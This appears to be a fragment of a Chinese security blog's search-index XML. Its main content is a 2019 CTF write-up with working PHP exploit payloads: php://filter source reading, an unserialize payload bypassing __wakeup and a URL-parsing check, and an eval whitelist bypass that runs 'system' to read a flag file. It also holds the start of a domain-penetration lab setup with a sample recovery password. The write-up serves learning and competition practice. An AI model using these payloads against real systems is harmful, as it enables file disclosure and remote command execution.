6da4e8001be544f62a9bc44dcca2c7f134ea2886361b8d93e1f2a6df5b50e73b18af5159588e30c543662c54cc0413865e27e4c4160483ed55890cd3b4eeac055f801fe79efe3fff4d3851eb447d3c031e905f3ec74cc1493f77c3a04756cd237b34ba852bbf145a9181b24c9a20299eccf20973ee2509cba27ce2b7631d52233d3164b67d715e5ebcf7155ecaa62f6a070ec94267443b863ac9c6729ce9429c1fc99020339aca2a23572823400966639f9e0108f7f96846229744fffafa13fdd1a9ec96466e2dcf7698e2898e41ba82283c91b0262a60c461d9a2eaba146761fb3fb31fdd0c6d1c67a965e0cba69c775f633738f222aca59aaf35bbfa1fb077dc490dba3e3abebdadd9e132dbe44f858dff36802500433aa13f694a81a2dd8ef60b16315eba6f1f3c8c08a700c228ccbc4d62ae8c042d2fcd8677350e9899a5e3db9bbe059185521de1efe94bcc32e257ddc480903b3c8824988b92b577674a22f1cf36d4c3b0d2b8cab317fe9f9c2e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360笔试总结</title>
      <link href="/p/bf99.html"/>
      <url>/p/bf99.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="dec7c44a33ab35a72daa84f256ce7409bd7d960a381c429ae1b18f8bb7e6e986"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年大学生信息安全竞赛</title>
      <link href="/p/80e1.html"/>
      <url>/p/80e1.html</url>
      
        <content type="html"><![CDATA[<p>总的来说 题目质量还是可以的</p><span id="more"></span><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="JustSoSo"><a href="#JustSoSo" class="headerlink" title="JustSoSo"></a>JustSoSo</h2><p>一道<code>php</code>的<code>文件读取+反序列化利用</code></p><p>文件代码如下</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable language_">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable language_">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析下，页面打开后没有加任何参数会显示<code>Missing parameter</code>和<code>Missing parameters</code>，注释中提示<code>index.php?file=xxx.php</code>，推测文件包含，尝试用伪协议读文件<code>php://filter/read=convert.base64-encode/resource=index.php</code>就得到上面<code>index.php</code>的代码，然后再<code>php://filter/read=convert.base64-encode/resource=hint.php</code>获取<code>hint.php</code>的代码，</p><p>都<code>down</code>下后进行审计</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  <span class="comment">//GET获取file参数</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];  <span class="comment">//GET获取payload参数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//包含文件</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>); <span class="comment">//此处将参数进行分割成数组，赋值给$query，但是该函数有个缺陷，可被形如url.com///index.php绕过</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123;  <span class="comment">//遍历匹配 检测flag，匹配到就显示stop hacking</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>); <span class="comment">//反序列化</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>hint.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable language_">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>(); <span class="comment">//handle成员销毁时调用getFlag();</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>)); <span class="comment">//token和token_flag为随机数1~10000后的md5值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>)); <span class="comment">//token_flag重新赋值为随机数1~10000后的md5值</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag) <span class="comment">//判断是否相等</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123; <span class="comment">//相等则显示指定文件的源代码</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable language_">$this</span>-&gt;file,<span class="literal">true</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确定获取flag的几个点</p><ol><li>利用反序列化</li><li>flag文件名为flag.php</li><li>token_flag可碰撞</li></ol><p>序列化构造脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拼接下Payload:<code>///index.php?file=hint.php&amp;payload=O:6:\&quot;Handle\&quot;:2:&#123;s:14:\&quot;%00Handle%00handle\&quot;;O:4:\&quot;Flag\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:8:\&quot;flag.php\&quot;;s:5:\&quot;token\&quot;;s:32:\&quot;8466a2b43729c29dcd7cc0fdfa1a9e7a\&quot;;&#125;&#125;</code></p><p>最后写个<code>python</code>脚本即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> res = requests.get( <span class="string">&quot;http://b47b37b1376f433698223cebd99a67579958251b431a4301.changame.ichunqiu.com///index.php?file=hint.php&amp;payload=O:6:\&quot;Handle\&quot;:2:&#123;s:14:\&quot;%00Handle%00handle\&quot;;O:4:\&quot;Flag\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:8:\&quot;flag.php\&quot;;s:5:\&quot;token\&quot;;s:32:\&quot;8466a2b43729c29dcd7cc0fdfa1a9e7a\&quot;;&#125;&#125;&quot;</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;times:&quot;</span> + <span class="built_in">str</span>(num_times) + <span class="string">&quot;\n&quot;</span> + res.text)</span><br></pre></td></tr></table></figure><p>吐槽下今年的<code>docker</code>环境，时不时假死，撞了500多次撞出来flag了</p><h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>依旧是个代码审计+构造</p><p>后端代码：</p><p>简单审计下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123; <span class="comment">//限制80个传入字符</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123; <span class="comment">//过滤&#x27;、&quot;、[、]、`、空格、制表符、换行符</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//检测传入值是否不在这个白名单内</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);  <span class="comment">//执行传入值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了所有的函数，能把数字转为字符串的函数为<code>dechex</code>和<code>base_convert</code>，然后构造了一天的命令执行，最后差了一步，直接放payload:<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=cat%20flag.php</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透-环境搭建</title>
      <link href="/p/242f.html"/>
      <url>/p/242f.html</url>
      
        <content type="html"><![CDATA[<p>记录下环境搭建</p><span id="more"></span><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="准备5台服务器，笔者环境如下"><a href="#准备5台服务器，笔者环境如下" class="headerlink" title="准备5台服务器，笔者环境如下"></a>准备5台服务器，笔者环境如下</h2><blockquote><ul><li>宿主机</li></ul><p>VMWare Esxi</p><ul><li>虚拟机</li></ul><ol><li><strong>Windows Server 2016 Datacenter (DC)</strong></li></ol><ul><li>IP:<code>10.16.11.17</code></li></ul><ol start="2"><li><strong>Windows Server 2012 R2 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.16</code></li></ul><ol start="3"><li><strong>Windows Server 2008 R2 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.15</code></li></ul><ol start="4"><li><strong>Windows Server 2008 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.18</code></li></ul><ol start="5"><li><strong>Windows Server 2016 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.19</code></li></ul></blockquote><p><img src="/images/1555317856529.png" alt="1555317861908"></p><h2 id="部署域控制器"><a href="#部署域控制器" class="headerlink" title="部署域控制器"></a>部署域控制器</h2><h3 id="修改DC机器名称"><a href="#修改DC机器名称" class="headerlink" title="修改DC机器名称"></a>修改DC机器名称</h3><p> <img src="/images/1555397952068.png" alt="1555397952068"></p><h3 id="更改DC机器为静态的IP地址"><a href="#更改DC机器为静态的IP地址" class="headerlink" title="更改DC机器为静态的IP地址"></a>更改DC机器为静态的IP地址</h3><p> <img src="/images/1555398172939.png" alt="1555398172939"></p><h3 id="安装角色"><a href="#安装角色" class="headerlink" title="安装角色"></a>安装角色</h3><p> <img src="/images/1555398266622.png" alt="1555398266622"></p><h3 id="然后一路下一步"><a href="#然后一路下一步" class="headerlink" title="然后一路下一步"></a>然后一路下一步</h3><h3 id="提升为域控制器"><a href="#提升为域控制器" class="headerlink" title="提升为域控制器"></a>提升为域控制器</h3><p> <img src="/images/1555398493945.png" alt="1555398493945"></p><h3 id="添加新林"><a href="#添加新林" class="headerlink" title="添加新林"></a>添加新林</h3><p> <img src="/images/1555398627978.png" alt="1555398627978"></p><h3 id="设置林、域功能级别和还原模式密码-这里我配置的123456q"><a href="#设置林、域功能级别和还原模式密码-这里我配置的123456q" class="headerlink" title="设置林、域功能级别和还原模式密码(这里我配置的123456q*)"></a>设置林、域功能级别和还原模式密码(这里我配置的<code>123456q*</code>)</h3><p> <img src="/images/1555398859326.png" alt="1555398859326"></p><table><thead><tr><th align="center"><strong>域功能级别</strong></th><th align="center"><strong>域控制器运行的操作系统</strong></th></tr></thead><tbody><tr><td align="center">Windows Server 2003</td><td align="center">Windows Server 2012<br/>Windows Server 2008 R2<br/>Windows Server 2008<br/>Windows Server 2003</td></tr><tr><td align="center">Windows Server 2008</td><td align="center">Windows Server 2008<br/>Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2008 R2</td><td align="center">Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012</td><td align="center">Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012 R2</td><td align="center">Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2016</td><td align="center">Windows Server 2016</td></tr></tbody></table><table><thead><tr><th align="center">林功能级别</th><th align="center">域控制器运行的操作系统</th></tr></thead><tbody><tr><td align="center">Windows Server 2003</td><td align="center">Windows Server 2012<br/> Windows Server 2008 R2<br/> Windows Server 2008<br/> Windows Server 2003</td></tr><tr><td align="center">Windows Server 